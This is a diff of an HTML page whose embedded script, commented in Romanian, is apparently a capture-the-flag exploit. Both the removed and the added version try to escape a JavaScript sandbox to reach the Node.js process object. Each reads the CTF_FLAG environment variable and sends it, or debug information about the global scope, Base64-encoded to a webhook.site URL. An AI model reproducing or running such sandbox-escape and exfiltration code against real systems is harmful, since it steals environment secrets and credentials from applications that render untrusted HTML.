@@ -2,25 +2,22 @@
 <html>
 <body>
     <script>
-        (async () => {
-            try {
-                // Faza 3 din document: Folosim constructorul Node pentru a accesa obiectul process [cite: 37, 41]
-                const outerRealmFunctionConstructor = Node.constructor;
-                
-                // Instanțiem un nou constructor pentru a returna obiectul global 'process' din Node.js [cite: 42]
-                const process = new outerRealmFunctionConstructor("return process")();
-                
-                // Extragem flag-ul din variabilele de mediu [cite: 19, 44]
-                const flag = process.env['CTF_FLAG'];
-
-                // Trimitem flag-ul către Webhook-ul tău sub formă codificată Base64
-                fetch("https://webhook.site/78f2bbfd-a624-4dbd-a111-64b02dba3961/?FLAG_OBTINUT=" + btoa(flag));
-                
-            } catch (e) {
-                // În caz de eroare, trimitem mesajul pentru debugging
-                fetch("https://webhook.site/78f2bbfd-a624-4dbd-a111-64b02dba3961/?EROARE=" + btoa(e.message));
-            }
-        })();
+        try {
+            // Încercăm să accesăm variabilele globale prin funcția de captură a erorilor
+            // Uneori 'process' este ascuns în contextul global, nu în 'window'
+            var global = (new Function("return this")());
+            var flag = global.process.env.CTF_FLAG;
+            
+            fetch("https://webhook.site/78f2bbfd-a624-4dbd-a111-64b02dba3961/?GATA=" + btoa(flag));
+        } catch (e) {
+            // Dacă dă eroare, cerem sistemului să ne arate TOT ce poate vedea în contextul Node
+            var debug = "";
+            try { 
+                debug = Object.keys(Function("return this")()).join(","); 
+            } catch(err) { debug = e.message; }
+            
+            fetch("https://webhook.site/78f2bbfd-a624-4dbd-a111-64b02dba3961/?DEBUG=" + btoa(debug));
+        }
     </script>
 </body>
 </html>
